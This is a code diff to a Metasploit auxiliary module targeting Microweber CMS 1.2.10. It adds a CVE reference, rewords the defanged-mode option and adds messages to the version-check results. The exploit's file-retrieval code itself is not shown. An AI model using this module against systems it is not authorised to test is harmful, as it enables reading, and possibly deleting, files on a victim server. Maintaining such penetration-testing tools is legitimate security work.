@@ -21,6 +21,7 @@ class MetasploitModule < Msf::Auxiliary
           'Talha Karakumru <talhakarakumru[at]gmail.com>'
         ],
         'References' => [
+          ['CVE', '2025-34076'],
           ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
         ],
         'Notes' => {
@@ -42,7 +43,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
         OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
         OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
-        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
+        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode. Block file retrieval that may delete the requested file from the target', true])
       ]
     )
   end
@@ -61,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if res.code == 200 && !res.body.include?('Microweber')
       print_error 'Microweber CMS has not been detected.'
-      Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Target does not appear to be running Microweber CMS')
     end
 
     if res.code != 200
@@ -80,22 +81,22 @@ class MetasploitModule < Msf::Auxiliary
       major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
       version = Rex::Version.new("#{major}.#{minor}.#{build}")
     rescue NoMethodError, TypeError
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Unknown('Could not extract Microweber version')
     end
 
     if version == Rex::Version.new('1.2.10')
       print_good 'Microweber version ' + version.to_s
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Microweber version #{version} is vulnerable")
     end
 
     print_error 'Microweber version ' + version.to_s
 
     if version < Rex::Version.new('1.2.10')
       print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown("Microweber version #{version} has not been tested")
     end
 
-    return Exploit::CheckCode::Safe
+    return Exploit::CheckCode::Safe("Microweber version #{version} is not vulnerable")
   end
 
   def try_login
